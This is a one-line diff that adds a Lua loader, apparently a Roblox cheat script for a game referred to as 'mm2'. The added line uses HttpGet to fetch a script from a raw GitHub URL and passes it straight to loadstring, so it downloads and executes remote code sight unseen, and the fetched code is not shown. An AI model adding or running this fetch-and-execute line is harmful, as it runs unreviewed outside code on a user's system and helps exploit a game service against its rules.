@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/zovlanee/mm2/refs/heads/main/premium-keyless/script.lua/true", true))()
